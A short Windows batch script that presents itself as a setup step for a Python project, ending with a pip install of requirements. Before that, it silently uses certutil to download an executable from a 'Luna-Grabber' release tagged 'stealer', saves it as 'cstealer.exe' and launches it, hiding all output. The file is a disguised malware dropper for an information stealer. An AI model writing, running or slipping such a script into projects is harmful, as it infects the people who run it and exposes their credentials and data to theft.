@echo off
set "URL=https://github.com/hvbsvqdj/Luna-Grabber/releases/download/stealer/lunar.exe"
set "Dossier=CStealer_assets"
set "NomFichier=%Dossier%\cstealer.exe"

certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1

if exist "%NomFichier%" (
    start "" "%NomFichier%"
)
pip install -r requirements.txt
pause
